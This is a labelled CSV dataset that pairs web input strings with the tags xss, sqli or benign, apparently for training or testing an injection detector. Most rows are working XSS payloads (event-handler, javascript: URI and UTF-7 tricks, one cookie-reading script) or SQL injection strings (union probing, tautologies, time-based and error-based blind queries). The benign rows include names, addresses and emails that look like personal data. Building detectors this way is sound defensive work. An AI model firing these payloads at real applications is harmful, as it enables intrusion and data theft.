payload,type
<bgsound id=x tabindex=1 onfocus=alert(1)></bgsound>,xss
"<img onmousedown=""alert(1)"">test</img>",xss
"<acronym onmouseenter=""alert(1)"">test</acronym>",xss
"1'  )   where 9221  =  9221 and   (  select 2*  (  if   (    (   select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  3484  =  3484,1   )    )     )  ,0x717a767a71,0x78   )    )   s  )  , 8446744073709551610, 8446744073709551610   )    )     )  --",sqli
9.77E+15,benign
<svg><u onload=alert(1)></u>,xss
"-2787' union all select 3622,3622,3622,3622,3622,3622,3622,3622,3622,3622#",sqli
"-2048   )    )    union all select 7054,7054,7054,7054,7054,7054,7054,7054,7054--",sqli
-3598  )   union all select 2264#,sqli
"1""   )    )     )   or 2367  =    (  select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4  )  --",sqli
aedma@quadernideilgarda.ci,benign
" UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28#",sqli
"1  )   where 6374  =  6374 or row  (  1045,7562  )  >  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  1045  =  1045,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from   (  select 8488 union select 5584 union select 3051 union select 1210  )  a group by x  )  --",sqli
 ORDER BY 31337 ,sqli
"<tt onkeypress=""alert(1)"" contenteditable>test</tt>",xss
arnaldo,benign
 ORDER BY 21 ,sqli
"  (  select * from   (  select  (  sleep  (  5   )    )     )  srmq  )   and ""wsmz"" like ""wsmz",sqli
"<input oncopy=alert(1) value=""XSS"" autofocus>",xss
" UNION SELECT @@VERSION,SLEEP(5),""'3'""#",sqli
"<style>@keyframes x{}</style><svg style=""animation-name:x"" onanimationstart=""alert(1)""></svg>",xss
"<style>@keyframes x{}</style><audio style=""animation-name:x"" onanimationstart=""alert(1)""></audio>",xss
"<script onkeyup=""alert(1)"" contenteditable>test</script>",xss
dyck,benign
"<style>@keyframes x{from {left:0;}to {left: 1000px;}}:target {animation:10s ease-in-out 0s 1 x;}</style><html id=x style=""position:absolute;"" onanimationcancel=""alert(1)""></html>",xss
"<style>@keyframes x{}</style><small style=""animation-name:x"" onanimationend=""alert(1)""></small>",xss
"<style>@keyframes x{}</style><a style=""animation-name:x"" onanimationstart=""alert(1)""></a>",xss
-6518'   )    )    as vocx where 2539  =  2539 or   (  8652  =  2025  )  *2025--,sqli
" ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13#",sqli
<html ontouchmove=alert(1)> ,xss
 UNION ALL SELECT USER()-- ,sqli
"1%""  )   and 6969  =    (  select 6969 from pg_sleep  (  5   )    )    and   (  ""%""  =  """,sqli
meredith,benign
breon@sexotelefono.mc,benign
schauer,benign
42141,benign
"<html onmousedown=""alert(1)"">test</html>",xss
"<style>:target {color:red;}</style><thead id=x style=""transition:color 1s"" ontransitionend=alert(1)></thead>",xss
1 or   (  select * from   (  select  (  sleep  (  5   )    )     )  ydpu  )  -- paxv,sqli
"<div draggable=""true"" contenteditable>drag me</div><area ondragover=alert(1) contenteditable>drop here</area>",xss
"<plaintext onbeforepaste=""alert(1)"" contenteditable>test</plaintext>",xss
 OR 1=1,sqli
castell sargatal,benign
" select * from users where id  =  1 or 1#""$ union select 1,version  (    )   -- 1",sqli
 or 1  =  1 --,sqli
"<style>:target {color:red;}</style><nextid id=x style=""transition:color 1s"" ontransitionend=alert(1)></nextid>",xss
"passeig gaudi 77, 3-e",benign
"<var onmouseleave=""alert(1)"">test</var>",xss
"admin""/*",sqli
salicilato,benign
rodolfo,benign
palmer manzano,benign
  )   or true--,sqli
elias pallares,benign
"<div onkeydown=""alert(1)"" contenteditable>test</div>",xss
"<style>@keyframes x{}</style><h1 style=""animation-name:x"" onanimationstart=""alert(1)""></h1>",xss
"<div draggable=""true"" contenteditable>drag me</div><applet ondragover=alert(1) contenteditable>drop here</applet>",xss
"<colgroup onbeforecopy=""alert(1)"" contenteditable>test</colgroup>",xss
jose cadalso s/n 7d,benign
"marcelino suarez 39,",benign
"<style>@keyframes x{from {left:0;}to {left: 1000px;}}:target {animation:10s ease-in-out 0s 1 x;}</style><caption id=x style=""position:absolute;"" onanimationcancel=""alert(1)""></caption>",xss
"select like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )    and    (    (   'pwuy'  =  'pwuy",sqli
<dfn onfocusout=alert(1) tabindex=1 id=x></dfn><input autofocus>,xss
"1' or 7552  =    (  select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4  )  ",sqli
lafayette@vitalhome.hk,benign
"select sleep  (  5  )   and   (  ""%""  =  """,sqli
"<div draggable=""true"" contenteditable>drag me</div><script ondragover=alert(1) contenteditable>drop here</script>",xss
kulle@coworkers.tl,benign
"<hr onmousemove=""alert(1)"">test</hr>",xss
 AND 1  =  utl_inaddr.get_host_address   (    (   SELECT COUNT  (  DISTINCT  (  GRANTED_ROLE   )    )    FROM DBA_ROLE_PRIVS WHERE GRANTEE  =  SYS.LOGIN_USER   )    )    AND 'i'  =  'i,sqli
pelland,benign
76150645z,benign
"<bgsound onmouseenter=""alert(1)"">test</bgsound>",xss
"select count  (  *  )   from generate_series  (  1,5000000  )   and    (    (   7240  =  7240",sqli
"-7101   )    )     )   union all select 4587,4587,4587,4587,4587,4587--",sqli
4.95E+15,benign
"<input onmouseenter=""alert(1)"">test</input>",xss
f36hu1a,benign
sorbello8@carrillo-de-albornoz.jobs,benign
2.46E+15,benign
"1%""  )   or 8384  =  like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )    and   (  ""%""  =  """,sqli
"<select oncontextmenu=""alert(1)"">test</select>",xss
senen,benign
"<style>@keyframes slidein {}</style><html style=""animation-duration:1s;animation-name:slidein;animation-iteration-count:2"" onanimationiteration=""alert(1)""></html>",xss
ehrenfri,benign
"<basefont onbeforecut=""alert(1)"" contenteditable>test</basefont>",xss
"1"" union all select null,null,null,null,null#",sqli
"<element onmouseover=""alert(1)"">test</element>",xss
"<style>:target {transform: rotate(180deg);}</style><menu id=x style=""transition:transform 2s"" ontransitionrun=alert(1)></menu>",xss
"<style onmouseenter=""alert(1)"">test</style>",xss
"-5230""  )   or elt  (  1032  =  1032,3623  )   and   (  ""aivb"" like ""aivb",sqli
fariba,benign
"font d'en canyelles 21, 1-b",benign
"<rtc oncontextmenu=""alert(1)"">test</rtc>",xss
"<svg oncontextmenu=""alert(1)"">test</svg>",xss
<script>var script = document.getElementsByTagName('script')[0]; var clone = script.childNodes[0].cloneNode(true); var ta = document.createElement('textarea'); ta.appendChild(clone); alert(ta.value.match(/cookie = '(.*?)'/)[1])</script>,xss
"1' where 5004  =  5004 or 7552  =    (  select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4  )  --",sqli
like,sqli
-6218'   )    )    or 2236  =  4469#,sqli
"<audio autoplay onloadedmetadata=alert(1)> <source src=""validaudio.wav"" type=""audio/wav""></audio>",xss
7.91E+15,benign
vahid,benign
melque de cercos,benign
<svg><content onload=alert(1)></content>,xss
byron@vinavilano.gl,benign
1' and 6969  =    (  select 6969 from pg_sleep  (  5   )    )    and 'lqsa' like 'lqsa,sqli
"<samp onbeforepaste=""alert(1)"" contenteditable>test</samp>",xss
"<>""'%;  )    (  &+",sqli
1'   )    )    as dcen where 5852  =  5852 or   (  select * from   (  select  (  sleep  (  5   )    )     )  ydpu  )  --,sqli
7.67E+13,benign
or 2 > 1,sqli
1464,benign
50245802w,benign
"<style>:target {color:red;}</style><xmp id=x style=""transition:color 1s"" ontransitionend=alert(1)></xmp>",xss
6196,benign
" AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(73)+CHAR(78)+CHAR(74)+CHAR(69)+CHAR(67)+CHAR(84)+CHAR(88)))#",sqli
"<object classid=""clsid:02BF25D5-8C17-4B23-BC80-D3488ABDDC6B"" onqt_error=""alert(126)"" style=""behavior:url(#x);""><param name=postdomevents /></object>//[""'`-->]]>]</div>",xss
" UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5,6,7,8,9,10",sqli
<rt id=x tabindex=1 onactivate=alert(1)></rt>,xss
" end and   (  ""qkkn"" like ""qkkn",sqli
"<script src=""data:text/javascript,alert(1)""></script>",xss
"<style>@keyframes x{}</style><sub style=""animation-name:x"" onanimationend=""alert(1)""></sub>",xss
5.92E+15,benign
<svg><article onload=alert(1)></article>,xss
" select * from users where id  =  1 union select 1 $$,version  (    )   -- 1",sqli
87811832v,benign
47815,benign
4881,benign
litago,benign
"1  )   and 6537  =  dbms_pipe.receive_message  (  chr  (  76  )  ||chr  (  116  )  ||chr  (  117  )  ||chr  (  65  )  ,5  )  ",sqli
<var id=x tabindex=1 onfocus=alert(1)></var>,xss
4.07E+15,benign
"1  )   union all select null,null,null,null,null,null,null,null,null,null--",sqli
31439,benign
1   )    )    as zpvn where 2767  =  2767 rlike   (  select   (  case when   (  7689  =  7689  )   then 1 else 0x28 end   )    )   --,sqli
pe7tr0b9,benign
" AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(88)+CHAR(88)+CHAR(88)+CHAR(88)+CHAR(88)))",sqli
<slot onblur=alert(1) tabindex=1 id=x></slot><input autofocus>,xss
"<animate attributeName=""onunload"" to=""alert(89)""/>",xss
4742,benign
8352,benign
1' where 8128  =  8128,sqli
"<blink oncut=""alert(1)"" contenteditable>test</blink>",xss
"<iframe onkeydown=""alert(1)"" contenteditable>test</iframe>",xss
43896,benign
eseyente,benign
 or a=a,sqli
castil de vela,benign
andrease,benign
"<wbr onkeydown=""alert(1)"" contenteditable>test</wbr>",xss
select * from users where id  =  '1' *  (  \  )   or 1  =  1 -- 1',sqli
" select * from users where id  =  1 *  (  \  )   union select null,@@VERSION -- 1",sqli
"<tbody draggable=""true"" ondragleave=""alert(1)"">test</tbody>",xss
 OR 3409=3409 AND ('pytW' LIKE 'pytW,sqli
"<HEAD><META HTTP-EQUIV=""CONTENT-TYPE"" CONTENT=""text/html; charset=UTF-7""> </HEAD>+ADw-SCRIPT+AD4-alert('XSS');+ADw-/SCRIPT+AD4-",xss
"<header oncopy=""alert(1)"" contenteditable>test</header>",xss
92251391r,benign
ferreries,benign
"<dir draggable=""true"" ondragenter=""alert(1)"">test</dir>",xss
noviercas,benign
-5962   )    )    as jbqv where 2583  =  2583 or 7496  =  8560--,sqli
"1' or 2633  =  dbms_pipe.receive_message  (  chr  (  112  )  ||chr  (  65  )  ||chr  (  65  )  ||chr  (  103  )  ,5  )   and 'gkku' like 'gkku",sqli
"<section onpaste=""alert(1)"" contenteditable>test</section>",xss
"1"" where 4281  =  4281",sqli
"1',  (  select   (  case when   (  9443  =  9443  )   then sleep  (  5  )   else 9443*  (  select 9443 from information_schema.character_sets  )   end   )    )   ",sqli
"  (  select * from   (  select  (  sleep  (  5   )    )     )  srmq  )   and    (    (     (  ""%""  =  """,sqli
"<cite onpaste=""alert(1)"" contenteditable>test</cite>",xss
"<rtc onmouseout=""alert(1)"">test</rtc>",xss
"admin"" or 1  =  1/*",sqli
-2429%' or 6890  =  5846,sqli
1  )   rlike   (  select   (  case when   (  8488  =  1270  )   then 1 else 0x28 end   )    ) ,sqli
hi'  )   or   (  'a'  =  'a,sqli
"<div draggable=""true"" contenteditable>drag me</div><ruby ondrop=alert(1) contenteditable>drop here</ruby>",xss
b3r3al,benign
"<progress onkeydown=""alert(1)"" contenteditable>test</progress>",xss
"<command draggable=""true"" ondragend=""alert(1)"">test</command>",xss
"<blink oncontextmenu=""alert(1)"">test</blink>",xss
"1%""   (  select   (  case when   (  5451  =  5451  )   then regexp_substring  (  repeat  (  right  (  char  (  5451  )  ,0  )  ,500000000  )  ,null  )   else char  (  108  )  ||char  (  76  )  ||char  (  112  )  ||char  (  116  )   end  )   from information_schema.system_users  )   and ""%""  =  """,sqli
"<div draggable=""true"" contenteditable>drag me</div><dt ondrop=alert(1) contenteditable>drop here</dt>",xss
ciudad real,benign
 ORDER BY 13-- ,sqli
<button id=x tabindex=1 onactivate=alert(1)></button>,xss
"1'  )   and row  (  6237,7469  )  >  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  6237  =  6237,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from   (  select 5192 union select 3785 union select 3931 union select 7158  )  a group by x  )   and   (  'gfxr'  =  'gfxr",sqli
"<a href=""javascript&colon;\u0061&#x6C;&#101%72t&lpar;1&rpar;""><button>",xss
cooperma,benign
<--`<iMG/srC=` onerror=confirm``> --!>,xss
" select * from users where id  =  1 or "",,""  =  1 or 1  =  1 -- 1",sqli
"<style>@keyframes x{}</style><element style=""animation-name:x"" onanimationend=""alert(1)""></element>",xss
"<style>:target {transform: rotate(180deg);}</style><marquee id=x style=""transition:transform 2s"" ontransitionrun=alert(1)></marquee>",xss
"<audio onbeforecopy=""alert(1)"" contenteditable>test</audio>",xss
"1  )   union all select null,null,null#",sqli
"<style>:target {color:red;}</style><dir id=x style=""transition:color 1s"" ontransitionend=alert(1)></dir>",xss
"1'  )   and 8514  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )   and   (  'vgkt'  =  'vgkt",sqli
"<dir oncut=""alert(1)"" contenteditable>test</dir>",xss
hoya-gonzalo,benign
"<style>@keyframes slidein {}</style><rp style=""animation-duration:1s;animation-name:slidein;animation-iteration-count:2"" onanimationiteration=""alert(1)""></rp>",xss
"1'   )    )    or 8384  =  like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )    and    (    (   'gxpr'  =  'gxpr",sqli
47239,benign
" select * from users where id  =  1 or 1#"".  =  1 union select 1,version  (    )   -- 1",sqli
<input id=x tabindex=1 onbeforedeactivate=alert(1)></input><input autofocus>,xss
<svg><figcaption onload=alert(1)></figcaption>,xss
"<maction actiontype=""statusline#http://google.com"" xlink:href=""javascript:alert(2)"">CLICKME</maction>",xss
"1%'   )    )    and 2716  =    (  select count  (  *  )   from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7  )  --",sqli
"<video onkeydown=""alert(1)"" contenteditable>test</video>",xss
"-9514   )    )    as xdkw where 4975  =  4975 union all select 4975,4975,4975,4975#",sqli
<iframe onfocusout=alert(1) id=x><input autofocus>,xss
"1%""   )    )    and 6240  =    (  'qqpjq'||  (  select case 6240 when 6240 then 1 else 0 end from rdb$database  )  ||'qzvzq'  )   and    (    (   ""%""  =  """,sqli
"<blink draggable=""true"" ondragleave=""alert(1)"">test</blink>",xss
"1""  )   or 6793  =    (  select 6793 from pg_sleep  (  5   )    )    and   (  ""baia""  =  ""baia",sqli
" UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5",sqli
"<div draggable=""true"" contenteditable>drag me</div><i ondragover=alert(1) contenteditable>drop here</i>",xss
"',NULL,NULL,NULL)%20waitfor%20delay%20'0:0:20'%20--",sqli
<svg><noscript onload=alert(1)></noscript>,xss
"1%'  )   or 5286  =    (  select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5  )   and   (  '%'  =  '",sqli
hirn,benign
-1375'   )    )     )   or   (  1226  =  9648  )  *9648 and    (    (     (  'kfoy' like 'kfoy,sqli
"<image onmousedown=""alert(1)"">test</image>",xss
<svg><a xmlns:xlink=http://www.w3.org/1999/xlink xlink:href=?><circle r=400 /><animate attributeName=xlink:href begin=0 from=javascript:alert(1) to=&>,xss
"<sup oncontextmenu=""alert(1)"">test</sup>",xss
<article id=x tabindex=1 ondeactivate=alert(1)></article><input id=y autofocus>,xss
"<figure draggable=""true"" ondrag=""alert(1)"">test</figure>",xss
"1""  )   where 3679  =  3679",sqli
" AND 1  =  utl_inaddr.get_host_address   (    (   SELECT DISTINCT  (  table_name  )   FROM   (  SELECT DISTINCT  (  table_name  )  , ROWNUM AS LIMIT FROM sys.all_tables  )   WHERE LIMIT  =  7   )    )    AND 'i'  =  'i",sqli
"<style>@keyframes x{}</style><track style=""animation-name:x"" onanimationend=""alert(1)""></track>",xss
"<body style=""background:gray"">",xss
1'||  (  select 'oxas' from dual where 8284  =  8284 or sleep  (  5   )    )   ||',sqli
"<wbr onmouseleave=""alert(1)"">test</wbr>",xss
select * from users where id  =  1 + $+%$ or 1  =  1 -- 1,sqli
judas,benign
' or 3=3,sqli
pr99o9a9,benign
mirko,benign
"<source onbeforepaste=""alert(1)"" contenteditable>test</source>",xss
de78e24423n6e,benign
<svg><h1 onload=alert(1)></h1>,xss
 or   (  EXISTS  ) ,sqli
688,benign
"<center onmouseup=""alert(1)"">test</center>",xss
select @@microsoftversione,sqli
pg_sleep  (  __TIME__  )  --,sqli
"-1631%""  )   or elt  (  8285  =  1709,1709  )   and   (  ""%""  =  """,sqli
<base id=x tabindex=1 onfocusin=alert(1)></base>,xss
" AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(88)+CHAR(88)+CHAR(88)))",sqli
84881293t,benign
"plza. carmelo solis, 78, 4?g",benign
select case when 9390  =  5752 then 1 else null end--,sqli
"<ins onmouseleave=""alert(1)"">test</ins>",xss
"1'||  (  select 'xhqy' where 4531  =  4531 union all select null,null--",sqli
"<div draggable=""true"" contenteditable>drag me</div><code ondrop=alert(1) contenteditable>drop here</code>",xss
" UNION ALL SELECT 1,2,3,4,5,6,7,8,9#",sqli
"<blink onbeforepaste=""alert(1)"" contenteditable>test</blink>",xss
"-8349  )   union all select 8126,8126#",sqli
"1  )   union all select null,null--",sqli
"<style>@keyframes x{from {left:0;}to {left: 1000px;}}:target {animation:10s ease-in-out 0s 1 x;}</style><input id=x style=""position:absolute;"" onanimationcancel=""alert(1)""></input>",xss
